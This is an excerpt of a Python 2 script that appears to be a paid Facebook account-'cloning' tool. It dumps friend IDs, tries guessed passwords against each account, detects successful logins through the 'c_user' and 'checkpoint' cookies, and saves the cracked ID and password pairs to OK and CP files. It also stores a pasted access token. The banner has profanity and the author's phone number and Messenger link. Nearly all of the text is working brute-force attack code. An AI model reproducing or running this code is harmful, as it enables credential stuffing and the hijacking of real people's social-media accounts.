...
logo = """'\x1b[0;37m'  
'\x1b[0;37m'    _________ _______  _       _________

    .aMMMb  dMP     .aMMMb  dMMMMMMMMb  .aMMMMP dMP dMMMMb 
   dMP"dMP dMP     dMP"dMP dMP"dMP"dMP dMP"    amr dMP.dMP 
  dMMMMMP dMP     dMMMMMP dMP dMP dMP dMP MMP"dMP dMMMMK"  
 dMP dMP dMP     dMP dMP dMP dMP dMP dMP.dMP dMP dMP"AMF   
dMP dMP dMMMMMP dMP dMP dMP dMP dMP  VMMMP" dMP dMP dMP    
...
'\x1b[0;37m'   Author      :      FUCK BOY ALAMGIR
'\x1b[0;37m'   Github      :      FUCK BOY ALAMGIR  
'\x1b[0;37m'   FB ID       :      https://m.me/Tera.Papa.Alamgir.441
'\x1b[0;37m'   TOOL TYPE   :         PAID TOOL
'\x1b[0;37m'   WAP NUMBER  :    +8801712034653         
"""
dec="2"
server="2"
...
def main_apv():
    ...
    r1=requests.get("https://github.com/cyberattack07/approval.txt/blob/main/approval.txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
...
def main_system():
    ...
    print "\x1b[0;37m[2]   Random Cloning     \x1b[0;37m (No Login)"
    print "\x1b[0;37m[3]   File Cloning       \x1b[0;37m (No Login)"
    print "\x1b[0;37m[4]   File Making Menu\x1b[0;37m    (Login)"
    print "\x1b[0;37m[5]   Check Subscription "
    print "\x1b[0;37m[6]   Update Tools"
    print "\x1b[0;37m[7]   For Any Help Massage WhatsApp"
    print 43*'~'
    print "\x1b[0;37m[*]\x1b[0;37m For Need Any Help Type 7 And \x1b[0;37mWhatsApp Me  "
    print 43*'~'
    main_input()
def main_input():
    mx=raw_input('\x1b[0;37m[*] Select :\x1b[0;37m ')
    if mx=='1':
        print ""
        print('\033[0;37m Cheking Subscription ....\033[0;37m')
        time.sleep(3)
        fb_menu()
    elif mx=='2':
        print ""
        ...
        print ("")
        print ("")
        print ("\x1b[0;37m        Congratulations Bro Your Pro")
        print ("\x1b[0;37m        Member In Alamgir Paid Commands ")
        print ("\x1b[0;37m        ENJOY  KRO BHI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
...
def numcloning():
    ...
    print ""
    coc=raw_input ('\033[0;37m\nChoice Code :\033[0;37m ')
    try:
        list = '.txt'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;93m[ALAMGIR-OK] "+coc+user + " | " + pass1
                ok=open('ALAMGIR random-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[0;37m[ALAMGIR-CP] "+coc+user + " | " + pass1
                    cp=open('ALAMGIR random-cp.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
...
def fb_menu():
    ...
    try:
        ...
        print "\033[0;37m\n[0] Back"
        print 39*'-'
        pp=raw_input('\033[0;37m\nSelect :\033[0;37m ')
        if pp=='1':
            os.system('clear')
            print logo
            print "\033[0;37m\n[*] Enter Your Token Hear"
            print ''
            tok=raw_input('\033[0;37m\n[*]PASTE TOKEN :\033[0;37m ')
            j=open('token.txt','w')
            j.write(tok)
            j.close()
            try:
                ...
                print ""
                print ""
                print ('\033[0;37m     Your Token Is Expire')
                time.sleep(3)
                os.system('rm -rf token.txt')
                main_system()
        else:
    ...
    print   ""
    print 39*'-'
    print "\033[0;37m[1] Public Cloning Method (1)"
    print "\033[0;37m[2] Public Cloning Method (2)"
    
    print "\033[0;37m[0] Back "
    print 39*'-'
    cz=raw_input('[!] Select : ')
    if cz=="1":
        print ""
        print "\033[0;37m      [ Public Cloning Method (1) ]"
        print ""
        print " [\033[0;37m cloning with pass or name + pass ]"
        print ""
        print "\033[0;37m[1] Cloning with password"
        print "\033[0;37m[2] Cloning with name + pass"
        print "\033[0;37m[0] Back"
        print ""
        c=raw_input("[!] Select : ")
        if c=='1':
        ...
        print ""
        print "\033[0;37m      [ Public Cloning Method (2) ]"
        print ""
        print "\033[0;37m [ cloning with pass or name + pass ]"
        print ""
        print "\033[0;37m[1] Cloning With Choice Password"
        print "\033[0;37m[2] Cloning With Name + Pass"
        print "\033[0;37m[3] Cloning With Auto Pass"
        print "\033[0;37m[0] Back"
        print ""
        vv=raw_input("\033[0;37m[!] Select :\033[0;37m ")
        if vv=="1":
            xokp()
        elif vv=="2":
            xoknp()
        ...
        print ""
        print ""
        print "\033[0;37m     [ File Making ]"
        print ""
        print "\033[0;37m  [ Maximum Limit 10 IDs ]"
        print ""
        c=raw_input("\033[0;37m      [*] How Many Links Do You Want To Dump : ")
        if c=='1':
            ext1()
        elif c=='2':
            ext2()
...
def mineExt():
    ...
    fuck.close()
    print ""
    print sm+"[=] Extracting From : "+nid+" > \x1b[0;37mFriends"
    print ""
    time.sleep(2)
    ...
    print g+"[=] Extracting From ALAMGIR : "+my_line[:15]
...
def xokpauto():
    ...
    fuck.close()
    print ""
    print sm+"[=] Transfer From : "+nid+" > \x1b[0;37mFriends"
    print ""
    time.sleep(2)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;93m[ALAMGIR-OK] "+uid + " | " + pass1
                ok=open('ALAMGIR-OK.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[0;37m[ALAMGIR-CP] "+uid + " | " + pass1
                    cp=open('ALAMGIR-CP.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;93m[ALAMGIR-OK] "+uid + " | " + pass2
                        ok=open('ALAMGIR-OK.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[0;37m[ALAMGIR-CP] "+uid + " | " + pass2
                            cp=open('ALAMGIR-CP.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;93m[ALAMGIR-OK] "+uid + " | " + pass3
                                ok=open('ALAMGIR-OK.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[0;37m[ALAMGIR-CP] "+uid + " | " + pass3
                                    cp=open('ALAMGIR-CP.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;93m[ALAMGIR-OK] "+uid + " | " + pass4
                                        ok=open('ALAMGIR-OK.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[0;37m[ALAMGIR-CP] "+uid + " | " + pass4
                                            cp=open('ALAMGIR-CP.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;93m[ALAMGIR-OK] "+uid + " | " + pass5
                                                ok=open('ALAMGIR-OK.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[0;37m[ALAMGIR-CP] "+uid + " | " + pass5
                                                    cp=open('ALAMGIR-CP.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;93m[ALAMGIR-OK] "+uid + " | " + pass6
                                                        ok=open('ALAMGIR-OK.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[0;37m[ALAMGIR-CP] "+uid + " | " + pass6
                                                            cp=open('ALAMGIR-CP.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
